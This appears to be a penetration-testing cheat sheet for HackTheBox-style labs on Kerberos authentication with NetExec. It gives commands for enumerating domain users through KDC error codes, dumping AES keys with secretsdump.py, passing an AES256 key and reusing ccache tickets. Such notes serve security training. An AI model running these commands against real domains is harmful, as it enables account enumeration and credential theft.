# 06.09 Kerberos Authentication

> Authenticate over Kerberos with `--kerberos`, `--aesKey`, or `--use-kcache` and double-use as a Kerbrute by reading KDC error codes.

## Overview

CME 5.4+ supports Kerberos authentication for SMB, LDAP, and MSSQL without needing the KRB5CCNAME env var. Use `--kerberos` with username/password for TGT requests (also functions as Kerbrute: KDC_ERR_C_PRINCIPAL_UNKNOWN = user doesn't exist; KDC_ERR_PREAUTH_FAILED = user exists; "asreproast attack" = pre-auth disabled). Use `--aesKey` for AES-256/128 (better opsec). Use `--use-kcache` with `KRB5CCNAME` env var to pass a ccache ticket. MSSQL requires FQDN/hostname target (not bare IP) for ccache auth.

## Steps

- Add DC FQDN to `/etc/hosts` before using Kerberos: `echo "<TARGET> dc01.<DOMAIN>.htb dc01 <DOMAIN> <DOMAIN>.htb" | sudo tee -a /etc/hosts`
- `--kerberos` with username+password performs TGT-based auth instead of NTLM.
- User enumeration: test non-existent/valid users — different KDC errors confirm existence.
- `--aesKey <aes256_hash>` authenticates using AES key (more opsec; avoids RC4 downgrade detection).
- Get AES keys with `secretsdump.py <domain>/<user>:<pass>@<DC_IP>`.
- Generate ccache with `getTGT.py <domain>/<user>:'<pass>' -dc-ip <DC_IP>` → `export KRB5CCNAME=$(pwd)/<user>.ccache`.
- `--use-kcache` uses the KRB5CCNAME ccache; no `-u/-p` needed.
- MSSQL ccache auth: use `nxc mssql dc01` (FQDN/hostname), not bare IP.

## Commands

### Add DC to /etc/hosts

```bash
echo -e "\n10.129.203.121 dc01.<DOMAIN>.htb dc01 <DOMAIN> <DOMAIN>.htb" | sudo tee -a /etc/hosts
```

### Kerberos auth with password

```bash
nxc smb <TARGET> -u robert -p <PASS> --kerberos --shares
```

### Kerberos user enumeration

```bash
nxc smb <TARGET> -u account_not_exist julio robert -p OtherPassword --kerberos
```

### Authenticate with AES256 key

```bash
nxc smb <TARGET> -u julio --aesKey 77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
```

### Generate TGT ccache file

```bash
getTGT.py <DOMAIN>.htb/robert:'<PASS>' -dc-ip <TARGET>
```

### Set KRB5CCNAME env var

```bash
export KRB5CCNAME=$(pwd)/robert.ccache
```

### SMB auth with ccache

```bash
nxc smb <TARGET> --use-kcache
```

### LDAP auth with ccache

```bash
nxc ldap <TARGET> --use-kcache
```

### MSSQL auth with ccache (FQDN)

```bash
nxc mssql dc01 --use-kcache
```

### List shares with ccache

```bash
nxc smb <TARGET> --use-kcache --shares
```
